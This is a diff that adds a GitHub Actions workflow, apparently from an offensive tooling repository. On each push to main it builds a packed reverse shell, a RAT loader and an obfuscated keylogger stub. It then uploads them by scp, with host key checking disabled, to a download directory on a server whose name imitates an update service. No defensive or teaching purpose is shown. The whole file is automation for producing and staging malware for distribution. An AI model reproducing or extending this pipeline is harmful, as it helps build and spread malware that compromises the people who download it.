@@ -1,0 +1,53 @@
+# Auto-build pipeline
+# Builds payloads on push and uploads to staging server
+#
+# Author: db88
+
+name: Build Payloads
+
+on:
+  push:
+    branches: [ main ]
+    paths:
+      - 'templates/**'
+      - 'obfuscation/**'
+      - 'builder.py'
+  workflow_dispatch:
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - uses: actions/checkout@v4
+      
+      - name: Set up Python
+        uses: actions/setup-python@v5
+        with:
+          python-version: '3.11'
+      
+      - name: Install dependencies
+        run: pip install pyyaml pycryptodome requests
+      
+      - name: Build reverse shell (packed)
+        run: python3 builder.py --template reverse_shell --pack --use-config
+      
+      - name: Build RAT loader (packed)
+        run: python3 builder.py --template rat_loader --pack --use-config
+      
+      - name: Build keylogger stub
+        run: python3 builder.py --template keylogger_stub --obfuscate --use-config
+      
+      # upload built payloads to staging server
+      - name: Deploy to staging
+        env:
+          STAGING_HOST: files.update-service.xyz
+          STAGING_USER: db88
+          STAGING_KEY: ${{ secrets.STAGING_SSH_KEY }}
+        run: |
+          mkdir -p ~/.ssh
+          echo "$STAGING_KEY" > ~/.ssh/deploy_key
+          chmod 600 ~/.ssh/deploy_key
+          scp -i ~/.ssh/deploy_key -o StrictHostKeyChecking=no \
+            output/*.py ${STAGING_USER}@${STAGING_HOST}:/var/www/dl/
+          echo "[+] Payloads deployed to staging"
